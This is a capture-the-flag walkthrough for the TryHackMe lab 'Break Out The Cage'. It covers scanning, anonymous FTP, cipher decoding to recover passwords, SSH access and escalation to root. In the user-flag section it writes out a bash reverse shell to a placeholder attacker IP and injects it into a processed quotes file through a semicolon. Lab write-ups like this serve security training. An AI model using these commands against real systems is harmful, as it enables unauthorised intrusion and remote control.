# [Break Out The Cage](https://tryhackme.com/room/breakoutthecage1)

## Help Cage bring back his acting career and investigate the nefarious goings on of his agent!

# Investigate!

## Let's find out what his agent is up to....

### What is Weston's password?

1. Begin by conducting a service version scan to identify open ports and running services on the target machine

```bash
nmap -sV <TARGET_IP>
```

<img width="650" height="200" alt="SCREEN01" src="https://github.com/user-attachments/assets/66ec3a11-ff8e-4cf3-af0c-599c98d34c1b" />

2. Since anonymous FTP access is available, explore the FTP service

```bash
ftp <TARGET_IP>
anonymous
ls -la
mget dad_tasks
```

<img width="652" height="376" alt="SCREEN02" src="https://github.com/user-attachments/assets/65911d43-bacc-4857-a587-09b1b14534ba" />

3. The content appears to be Base64 encoded text. After Base64 decoding, the result is a Vigenère cipher. Use [CyberChef](https://gchq.github.io/CyberChef/) for Base64 decoding. For Vigenère cipher analysis use [dCode](https://www.dcode.fr/vigenere-cipher)
   - The decrypted password is: `Mydadisghostrideraintthatcoolnocausehesonfirejokes`

<img width="792" height="498" alt="SCREEN03" src="https://github.com/user-attachments/assets/7f6e84a2-25a4-4013-8f30-b5200cec170e" />

### What's the user flag?

1. With Weston's password recovered, we can now establish an SSH connection to gain initial access to the system

```bash
ssh weston@<TARGET_IP>
# Password: Mydadisghostrideraintthatcoolnocausehesonfirejokes
```

2. Examine the current user's privileges and available sudo permissions

```bash
sudo -l
sudo /usr/bin/bees
```

<img width="649" height="145" alt="SCREEN04" src="https://github.com/user-attachments/assets/1544df2c-76f9-4a38-88f0-b6bff0252d2b" />

3. Conduct system enumeration to identify files owned by other users, particularly the "cage" user

```bash
find / -type f -user cage 2>/dev/null
```

<img width="530" height="46" alt="SCREEN05" src="https://github.com/user-attachments/assets/d3fad42f-2c1c-4d9c-9931-dbadbbcd35f0" />

4. Created a reverse shell script in `/tmp/shell.sh`. Inject the shell execution command into a quotes file that gets processed by an automated script

**Setup reverse shell listener**

```bash
nc -lvnp 4444
```

**Create and deploy payload**

```bash
cat > /tmp/shell.sh << EOF
#!/bin/bash
bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1
EOF

chmod +x /tmp/shell.sh

printf 'Hello;/tmp/shell.sh\n' > /opt/.dads_scripts/.files/.quotes
```

5. After gaining access as the "cage" user through our reverse shell retrieve the user flag

```bash
ls -la
cat Super_Duper_Checklist
```

<img width="651" height="379" alt="SCREEN06" src="https://github.com/user-attachments/assets/f92610d8-b613-46df-983d-dc924aa037ff" />

### What's the root flag?

1. Now operating with "cage" user privileges, explore additional directories and files for privilege escalation opportunities

```bash
cd email_backup
cat email_3
```

<img width="651" height="392" alt="SCREEN07" src="https://github.com/user-attachments/assets/6971aadc-9a80-4747-85e7-1da1bc389af5" />

2. The email content appears to be encrypted using another Vigenère cipher. Use [CyberChef](https://gchq.github.io/CyberChef/) for Vigenère decryption, the key is `FACE`
   - The decrypted password is: `cageisnotalegend`

<img width="726" height="522" alt="SCREEN08" src="https://github.com/user-attachments/assets/2f125cfc-2d80-4f6a-bb8e-7ecc951df1bf" />

3. With the discovered password, escalate privileges to root

```bash
su root
# cageisnotalegend

cat /root/email_backup/email_2
```

<img width="649" height="374" alt="SCREEN09" src="https://github.com/user-attachments/assets/e8bf6917-88de-47b9-964f-a04aed66f99b" />
